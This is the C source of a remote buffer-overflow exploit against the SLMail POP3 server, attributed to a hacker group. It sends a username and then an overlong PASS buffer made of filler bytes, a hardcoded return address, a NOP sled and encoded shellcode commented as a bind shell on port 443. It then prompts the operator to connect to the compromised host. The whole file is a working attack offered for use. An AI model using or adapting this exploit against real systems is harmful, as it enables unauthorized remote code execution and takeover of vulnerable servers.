/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#define retadd "\x8f\x35\x4a\x5f"

// [*] bind 443 
unsigned char shellcode[] = 
"\xbe\xf7\x94\xd6\xeb\xd9\xca\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x31\x70\x12\x83\xc0\x04\x03\x87\x9a\x34\x1e\x9b\x4b\x3a\xe1\x63\x8c\x5b\x6b\x86\xbd\x5b\x0f\xc3\xee\x6b\x5b\x81\x02\x07\x09\x31\x90\x65\x86\x36\x11\xc3\xf0\x79\xa2\x78\xc0\x18\x20\x83\x15\xfa\x19\x4c\x68\xfb\x5e\xb1\x81\xa9\x37\xbd\x34\x5d\x33\x8b\x84\xd6\x0f\x1d\x8d\x0b\xc7\x1c\xbc\x9a\x53\x47\x1e\x1d\xb7\xf3\x17\x05\xd4\x3e\xe1\xbe\x2e\xb4\xf0\x16\x7f\x35\x5e\x57\x4f\xc4\x9e\x90\x68\x37\xd5\xe8\x8a\xca\xee\x2f\xf0\x10\x7a\xab\x52\xd2\xdc\x17\x62\x37\xba\xdc\x68\xfc\xc8\xba\x6c\x03\x1c\xb1\x89\x88\xa3\x15\x18\xca\x87\xb1\x40\x88\xa6\xe0\x2c\x7f\xd6\xf2\x8e\x20\x72\x79\x22\x34\x0f\x20\x2b\xf9\x22\xda\xab\x95\x35\xa9\x99\x3a\xee\x25\x92\xb3\x28\xb2\xd5\xe9\x8d\x2c\x28\x12\xee\x65\xef\x46\xbe\x1d\xc6\xe6\x55\xdd\xe7\x32\xf9\x8d\x47\xed\xba\x7d\x28\x5d\x53\x97\xa7\x82\x43\x98\x6d\xab\xee\x63\xe6\xde\xe5\x6b\x24\xb6\xfb\x6b\xc9\xfc\x75\x8d\xa3\x12\xd0\x06\x5c\x8a\x79\xdc\xfd\x53\x54\x99\x3e\xdf\x5b\x5e\xf0\x28\x11\x4c\x65\xd9\x6c\x2e\x20\xe6\x5a\x46\xae\x75\x01\x96\xb9\x65\x9e\xc1\xee\x58\xd7\x87\x02\xc2\x41\xb5\xde\x92\xaa\x7d\x05\x67\x34\x7c\xc8\xd3\x12\x6e\x14\xdb\x1e\xda\xc8\x8a\xc8\xb4\xae\x64\xbb\x6e\x79\xda\x15\xe6\xfc\x10\xa6\x70\x01\x7d\x50\x9c\xb0\x28\x25\xa3\x7d\xbd\xa1\xdc\x63\x5d\x4d\x37\x20\x6d\x04\x15\x01\xe6\xc1\xcc\x13\x6b\xf2\x3b\x57\x92\x71\xc9\x28\x61\x69\xb8\x2d\x2d\x2d\x51\x5c\x3e\xd8\x55\xf3\x3f\xc9";

void exploit(int sock) {
      FILE *test;
      char *ptr = calloc(2969, 1);
      char userbuf[] = "USER madivan\r\n";
	char buf[3100];
      char evil[2607];
      char receive[1024];
      char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
	memset(buf, 0, 3100);
      memset(evil, 0x00, 2607);
      memset(evil, 0x43, 2606);
      strcat(ptr, evil);
    strcat(ptr, retadd);
    strcat(ptr, nop);
      strcat(ptr, shellcode);

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", ptr);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 443...\n\n");
	free(ptr);
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
